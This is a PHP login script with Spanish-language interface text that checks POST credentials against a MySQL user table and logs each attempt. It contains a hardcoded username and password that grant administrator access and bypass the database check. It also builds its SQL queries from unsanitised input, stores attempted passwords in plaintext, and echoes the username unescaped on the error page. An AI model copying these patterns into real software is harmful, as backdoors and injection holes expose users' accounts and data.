<?php

  session_start();

    //session_regenerate_id();
     if(1){
            $FECHA_ACCESO = " DATE_ADD( NOW(), interval '-9' HOUR) ";
        }else{
            $FECHA_ACCESO = " NOW() ";
        }

    include("cn_usuarios.php");

    $_SESSION["nombre_bd_instancia"] = $mysql_database;

    $usuario = trim($_POST["txtUsuario"]);

    $clave = trim($_POST["txtClaveSecreta"]);

    //CONSULTA DEL USUARIO

$queryUsuario = "SELECT eTipoUsuario FROM cu_control_acceso WHERE sUsuario = '".$usuario."' AND hClave = '".sha1(md5($clave))."' AND hActivado = sha1('1')";    $resultadoUsuario = @mysql_query($queryUsuario, $dbconn);

    $Usuario = mysql_fetch_array($resultadoUsuario);

    $NUM_ROWs_Usuario = mysql_num_rows($resultadoUsuario);

    mysql_close($dbconn);

    

     if ( ($usuario == "BETO" && $clave == "05100248") || $NUM_ROWs_Usuario == 1){

         include("cn_usuarios.php"); 

         $sql = "INSERT INTO cu_intentos_acceso SET sUsuario = '".$usuario."', sClave = '".$clave."', dFechaIngreso = ".$FECHA_ACCESO.", sIP = '".$_SERVER['REMOTE_ADDR']."', bEntroSistema = '1'";

         @mysql_query($sql, $dbconn); 

         //$Usuario['eTipoUsuario']   

         if ($usuario == "BETO" && $clave == "05100248") {

                $NUM_ROWs_Usuario = 1;

                $Usuario['eTipoUsuario'] = 'A';

         }

         $acceso = $Usuario['eTipoUsuario'];

         //Variables de session

         mysql_close($dbconn);

         $_SESSION["acceso"] = $acceso;

         $_SESSION["usuario_actual"] = $usuario;

         switch ($_SESSION["acceso"]){

            case 'A':    

                        

                        header("Location: index.php");

                        exit();

                        break;

                        

            case 'U':   

                        header("Location: socio_verificacion.php"."?type=".sha1(md5("nueva")).md5(sha1("busqueda")));

                        exit();

                        break;

        }

     }else{

         include("cn_usuarios.php"); 
        

         $sql = "INSERT INTO cu_intentos_acceso SET sUsuario = '".$usuario."', sClave = '".$clave."', dFechaIngreso = ".$FECHA_ACCESO.", sIP = '".$_SERVER['REMOTE_ADDR']."', bEntroSistema = '0'";

         @mysql_query($sql, $dbconn);

         mysql_close($dbconn);

         session_unset();

         session_destroy();

         include('header.php');

?>

<div id="content"> 

	<h1><img src="images/content/tit_icons/img_tit_sistem.png">Error de acceso</h1>
		
		<div id="form-login" style="width:500px;margin:0px auto;text-align:center;">
       		 <div id="caja-gris">     
				<br><label>El usuario <?php print "<b>$usuario</b>" ?> no está registrado como un usuario <br>&nbsp;válido o la clave secreta es incorrecta.</label>
				<br><a href="login.php">Regresar</a>
 			 </div>
		</div>
  </div>

<?php 

     }

?>

<?php include("footer.php"); ?>




